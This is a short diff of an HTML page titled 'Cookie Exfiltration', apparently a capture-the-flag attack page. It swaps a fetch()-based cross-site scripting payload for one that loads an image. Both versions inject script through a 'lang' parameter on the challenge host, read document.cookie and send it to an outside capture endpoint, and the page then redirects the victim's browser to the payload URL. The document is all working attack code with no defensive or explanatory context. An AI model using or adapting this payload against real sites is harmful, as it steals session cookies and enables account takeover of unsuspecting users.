@@ -3,8 +3,8 @@
 <head>
     <title>Cookie Exfiltration</title>
     <script>
-        // Redirect to the vulnerable endpoint with XSS payload
-        const xssPayload = '"; fetch("https://ssrf-eta.vercel.app/api/capture?cookies=" + encodeURIComponent(document.cookie)); //';
+        // Redirect to the vulnerable endpoint with XSS payload using image exfiltration
+        const xssPayload = '"; var img = new Image(); img.src = "https://ssrf-eta.vercel.app/api/capture?cookies=" + encodeURIComponent(document.cookie); //';
         const targetUrl = 'http://chal1.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
         
         window.location.href = targetUrl;
